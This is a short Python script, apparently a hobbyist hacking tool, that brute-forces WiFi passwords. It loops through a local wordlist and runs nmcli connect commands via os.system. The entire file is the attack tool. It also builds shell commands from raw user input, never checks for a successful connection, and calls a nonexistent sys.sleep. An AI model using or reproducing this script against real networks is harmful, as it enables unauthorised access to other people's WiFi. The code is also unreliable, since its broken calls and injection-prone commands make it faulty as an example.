#!/usr/bin/python3

import sys
import os
import time

flag = False

print("___ Enter the user name ___ \n")
U_name = input("username:")


def pas():
	os.chdir('/home/alex/Documents/Hacking')
	with open ("passwords.txt","r") as f :
		for line in f:
		    yield line.strip()

banner = """




_____BRUTEFORCER STARTING_____



\n """ 
								
for i in banner:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
								

stm = "nmcli device wifi connect"

pswd_lst = pas()


for pswd in pswd_lst:

    try:
	    time.sleep(0.1)
	    #pswd = pswd_lst[x].rstrip('\n')
	    cmd = stm + " " + U_name + " " + "password" + " " +  " \"" + pswd + "\""
	    print( "trying " + pswd)
	    os.system(cmd)
	    time.sleep(0.01)        
    except OSError:
        print("+++ == AN ERROR OCCURED == +++")
        break

end_msg = " ___ BRUTEFORCE completed ___"

for i in end_msg:
    sys.stdout.write(i)
    sys.stdout.flush()
    sys.sleep(0.05)
    










